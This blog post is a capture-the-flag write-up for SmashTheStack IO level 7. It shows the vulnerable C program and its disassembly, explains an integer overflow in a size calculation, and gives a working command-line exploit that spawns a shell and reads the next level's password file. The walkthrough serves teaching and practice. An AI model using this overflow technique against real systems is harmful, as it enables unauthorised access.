@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html>
+   <head>
+   <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>
+    
+    
+    Levels 7 and 7_alt - IO at STS - OJ&#39;s Perspective
+    
+  </title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/bootstrap-theme.min.css">
+
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/holder.min.js" type='text/javascript'></script>
+  <link rel="stylesheet" href="/highlight/styles/github-gist.css">  
+  <link rel="stylesheet" href="/css/style.css">
+
+  <link rel="canonical" href="/posts/levels-7-and-7_alt-io-at-sts/">
+  
+  <script src="/highlight/highlight.pack.js" type='text/javascript'></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.3.0/highlightjs-line-numbers.min.js"></script>
+  <script type="text/javascript">
+
+    $(document).ready(function() {
+    
+    hljs.initHighlightingOnLoad();
+    $('pre code').each(function(i, block) {
+    hljs.highlightBlock(block);
+    hljs.lineNumbersBlock(block);
+    });
+});
+  </script>
+   </head>
+   <body data-spy="scroll" data-target="#toc">
+     <header class="navbar navbar-default navbar-fixed-top" id="top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">OJ&#39;s Perspective</a>
+    </div>
+
+    
+    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+      <ul class="nav navbar-nav">
+	
+	
+	<li  ><a href="/">Home</a></li>
+	
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+	
+	<li > <a href="/streaming/" >Live Streaming</a></li>
+	
+
+	
+
+	
+	
+	<li > <a href="/about/" >About</a></li>
+	
+
+	
+	
+	<li > <a href="/contact/" >Contact</a></li>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+      </ul>
+</nav>
+</header>
+
+     <div class="jumbotron masthead" role="main">
+       <div class="container">
+	 <div class="row">
+
+ 	   <div class="col-md-8 col-md-offset-2 ">
+	   
+<div class="panel panel-default">
+  <div class="panel-body">
+      <article id='post' >
+	<h1> Levels 7 and 7_alt - IO at STS </h1>
+	  
+	  <span class="text-muted">Posted by:&nbsp;Thu Aug 15, 2013</span>
+
+	  <p>I&rsquo;ve been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They&rsquo;re great fun.</p>
+
+<h2 id="spoiler-alert">Spoiler Alert</h2>
+
+<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven&rsquo;t done these levels yourself yet, and you plan to, then please don&rsquo;t read this until you&rsquo;ve nailed them yourself. I&rsquo;d hate for this to ruin your experience.</p>
+
+<p>However, if you&rsquo;ve done the level or you&rsquo;re just interested in what&rsquo;s involved, please read on.</p>
+
+<h2 id="connecting">Connecting</h2>
+
+<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won&rsquo;t be sharing passwords here).</p>
+
+<pre><code>$ ssh level7@io.smashthestack.org
+</code></pre>
+
+<p>Let&rsquo;s see what challenges there are for us:</p>
+
+<pre><code>level7@io:~$ ls /levels/level07*
+/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
+</code></pre>
+
+<p>This level has two possible entry points, and we&rsquo;ll be covering both in this post.</p>
+
+<h2 id="level-07">Level 07</h2>
+
+<p>We start by looking at the source of the target program:</p>
+
+<pre><code>//written by bla
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv)
+{
+        int count = atoi(argv[1]);
+        int buf[10];
+
+        if(count &gt;= 10 ) 
+                return 1;
+
+        memcpy(buf, argv[2], count * sizeof(int));
+
+        if(count == 0x574f4c46) {
+                printf(&quot;WIN!\n&quot;);
+                execl(&quot;/bin/sh&quot;, &quot;sh&quot; ,NULL);
+        } else
+                printf(&quot;Not today son\n&quot;);
+
+        return 0;
+}
+</code></pre>
+
+<p>What&rsquo;s clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that&rsquo;s written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won&rsquo;t be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>
+
+<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>
+
+<p>What&rsquo;s interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>
+
+<pre><code>gdb$ disas main
+Dump of assembler code for function main:
+0x08048414 &lt;main+0&gt;:    push   ebp
+0x08048415 &lt;main+1&gt;:    mov    ebp,esp
+0x08048417 &lt;main+3&gt;:    sub    esp,0x68
+0x0804841a &lt;main+6&gt;:    and    esp,0xfffffff0
+0x0804841d &lt;main+9&gt;:    mov    eax,0x0
+0x08048422 &lt;main+14&gt;:   sub    esp,eax
+0x08048424 &lt;main+16&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048427 &lt;main+19&gt;:   add    eax,0x4
+0x0804842a &lt;main+22&gt;:   mov    eax,DWORD PTR [eax]
+0x0804842c &lt;main+24&gt;:   mov    DWORD PTR [esp],eax
+0x0804842f &lt;main+27&gt;:   call   0x8048354 &lt;atoi@plt&gt;
+0x08048434 &lt;main+32&gt;:   mov    DWORD PTR [ebp-0xc],eax
+0x08048437 &lt;main+35&gt;:   cmp    DWORD PTR [ebp-0xc],0x9
+0x0804843b &lt;main+39&gt;:   jle    0x8048446 &lt;main+50&gt;
+0x0804843d &lt;main+41&gt;:   mov    DWORD PTR [ebp-0x4c],0x1
+0x08048444 &lt;main+48&gt;:   jmp    0x80484ad &lt;main+153&gt;
+0x08048446 &lt;main+50&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+0x08048449 &lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
+0x0804844c &lt;main+56&gt;:   mov    DWORD PTR [esp+0x8],eax
+0x08048450 &lt;main+60&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048453 &lt;main+63&gt;:   add    eax,0x8
+0x08048456 &lt;main+66&gt;:   mov    eax,DWORD PTR [eax]
+0x08048458 &lt;main+68&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x0804845c &lt;main+72&gt;:   lea    eax,[ebp-0x48]
+0x0804845f &lt;main+75&gt;:   mov    DWORD PTR [esp],eax
+0x08048462 &lt;main+78&gt;:   call   0x8048334 &lt;memcpy@plt&gt;
+0x08048467 &lt;main+83&gt;:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
+0x0804846e &lt;main+90&gt;:   jne    0x804849a &lt;main+134&gt;
+0x08048470 &lt;main+92&gt;:   mov    DWORD PTR [esp],0x8048584
+0x08048477 &lt;main+99&gt;:   call   0x8048344 &lt;printf@plt&gt;
+0x0804847c &lt;main+104&gt;:  mov    DWORD PTR [esp+0x8],0x0
+0x08048484 &lt;main+112&gt;:  mov    DWORD PTR [esp+0x4],0x804858a
+0x0804848c &lt;main+120&gt;:  mov    DWORD PTR [esp],0x804858d
+0x08048493 &lt;main+127&gt;:  call   0x8048324 &lt;execl@plt&gt;
+0x08048498 &lt;main+132&gt;:  jmp    0x80484a6 &lt;main+146&gt;
+0x0804849a &lt;main+134&gt;:  mov    DWORD PTR [esp],0x8048595
+0x080484a1 &lt;main+141&gt;:  call   0x8048344 &lt;printf@plt&gt;
+0x080484a6 &lt;main+146&gt;:  mov    DWORD PTR [ebp-0x4c],0x0
+0x080484ad &lt;main+153&gt;:  mov    eax,DWORD PTR [ebp-0x4c]
+0x080484b0 &lt;main+156&gt;:  leave  
+0x080484b1 &lt;main+157&gt;:  ret    
+End of assembler dump.
+</code></pre>
+
+<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let&rsquo;s have a look at that in action by whipping up a sample program and viewing the output:</p>
+
+<pre><code>int main(int argc, char **argv)
+{
+    int x = -2147483647;
+    printf(&quot;%p\n&quot;, x);
+    printf(&quot;%p\n&quot;, x &lt;&lt; 2);
+    printf(&quot;%p\n&quot;, (x + 16) &lt;&lt; 2);
+    printf(&quot;%p\n&quot;, (x + 32) &lt;&lt; 2);
+    return 0;
+}
+</code></pre>
+
+<p>Compile this code with <code>gcc</code> and run it, and you&rsquo;ll find the following:</p>
+
+<pre><code>level7@io:/tmp/tc7$ ./a.out
+0x80000001
+0x4
+0x44
+0x84
+</code></pre>
+
+<p>So we can pass in a negative integer, have it shift and turn it into a positive that&rsquo;s big enough to overflow the buffer. Once we&rsquo;ve overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it&rsquo;ll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let&rsquo;s see how this looks:</p>
+
+<pre><code>level7@io:$ /levels/level07 -2147483600 `perl -e 'print &quot;\x46\x4c\x4f\x57&quot; x 100'`
+WIN!
+sh-4.1$ cat /home/level8/.pass
+&lt;&lt; -- password was printed here -- &gt;&gt;
+</code></pre>
+
+<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>
+
+<h2 id="level-07-alt">Level 07 alt</h2>
+
+<p>Out of respect for the author of the challenge, and the effort that went into to creating it, I have removed my walkthrough for Level 07 alt.</p>
+
+<p>This challenge took me a <em>very long time</em> to complete. It took research, patience, creativity and lots of sweat. I highly recommend attempting to nail this by yourselves. I&rsquo;d like to shout out to Lars Haulin, the creator, for his amazing job in creating this little masterpiece.</p>
+
+<p>Feedback is appreciated as always. Thanks for reading.</p>
+
+	  
+	  	  <div class="tags">	
+	    <p class="categories">
+	  
+	  <a class="btn btn-default btn-xs text-capitalize" href="/categories/smashthestack-io">SmashTheStack-IO</a>
+	  
+	  <a class="btn btn-default btn-xs text-capitalize" href="/categories/security">Security</a>
+	  
+	    </p>
+	    
+
+	    	  </div>
+	    
+
+
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ojsrants" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      </div>
+      </div></article>
+
+
+	 </div>
+
+	 </div>
+       </div>
+     </div>
+
+ <div class="container footer">
+  <div class="row">
+    <div class="col-md-10">
+      <small class="text-muted">Copyright OJ Reeves 2019 Theme:<a href="https://feiio.com/">eiio</a></small>
+    </div>
+    <div class="col-md-2">
+      <small class="text-muted">Trying to make the Internet less shit, one bit at a time.</small>
+      </div>
+   </div>
+ </div>
+</body></html>
